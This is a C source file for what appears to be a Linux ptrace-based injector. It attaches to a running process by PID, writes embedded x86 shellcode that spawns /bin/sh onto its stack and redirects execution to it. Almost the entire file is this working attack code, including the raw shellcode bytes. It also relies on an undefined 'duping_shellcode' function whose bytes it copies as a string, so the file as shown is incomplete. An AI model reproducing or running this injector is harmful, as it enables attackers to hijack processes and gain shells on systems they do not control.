#include <stdio.h>
#include <sys/ptrace.h>
#include <linux/user.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <link.h>
#include <elf.h>
#include <errno.h>

void duping_shellcode();
char *shellcode;
char *databkp;

char mesg[] = 

   /* execve /bin/sh */

   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
   "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
   "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
   "\xd7\xff\xff\xff/bin/sh";
  
int Coin(pid_t pid)
{
  int eipbkp,espbkp,error, ptr, begin, i = 0;
  
  /* Structure to store the Registers */
  struct user_regs_struct data,bdata,b2;   
  
  long int *p_databkp;


  printf("[+] Trying to inject shellcode on process %d\n", pid);

  if ((error = ptrace(PTRACE_ATTACH, pid, NULL, NULL))) {
    perror("Attach");
    exit(1);
  }
  /* Wait for the process to stop */
  waitpid(pid, NULL, 0); 
  
  if((error = ptrace(PTRACE_GETREGS, pid, &data, &data))) {
    perror("Getregs");
  }
  
  bdata=data;

  /* Print the contents  of registers */
  printf("[+] Original %%eip : 0x%.8lx\n", data.eip); 
  printf("             %%esp : 0x%.8lx\n", data.esp); 



  /* Save the registers into the stack */
  data.esp -= 4;
  ptrace(PTRACE_POKETEXT,pid,data.esp,data.eip);


  /* Get the location to which we have to write */
  
  ptr = begin = data.esp-1024; 
  
  /* Change the Pointer */
  data.eip = (long) begin + 2; 
  printf("[*] Inserting shellcode into %.8lx\n", (long)data.eip);

  /* Set the Registers */
  ptrace(PTRACE_SETREGS, pid, &data, &data);       

  printf("[+] Shellcode Length: %d\n",strlen(shellcode));


  /* Insert the code and backup */	
  while (i < strlen(shellcode)) { 

    /* Backup process memory space before write */  
    p_databkp=(long int *)&databkp[i];
    *p_databkp=ptrace(PTRACE_PEEKDATA, pid, ptr, NULL);

    /* Inject shellcode */                 
    ptrace(PTRACE_POKEDATA, pid, ptr, (int) *(int *) (shellcode + i));
    i += 4;
    ptr += 4;
  }
  /* Detach the Process, don't forget this */
  ptrace(PTRACE_DETACH, pid, NULL, NULL); 
                                          

}

int main(int argc, char **argv) {

  /* Process Id */
    
  pid_t pid;  

  if(argc < 2) 
    return printf("Usage: %s pid",argv[0]);

  pid = atoi(argv[1]);


  /* Copy Shellcode into buffer */
  shellcode = (char *)malloc(strlen((char *) duping_shellcode) + strlen(mesg) + 4);
  
  /* First put duping shellcode */
  
  strcpy(shellcode, (char *) duping_shellcode); 
  
  /* and after copy the shellcode located in mesg buffer  */
  strcat(shellcode, (char *) mesg);

  /* Allocate buffer for backup memory */	
  databkp = (char *)malloc(strlen((char *) duping_shellcode) + strlen(mesg) + 4);

  sleep(1);

  /* Call the injector function*/
  Coin(pid); 
  usleep(1); 

  /* Kill the process, Optional */
  
  //  kill(pid, 9);  
  //  wait(NULL);			
  return 0;
}
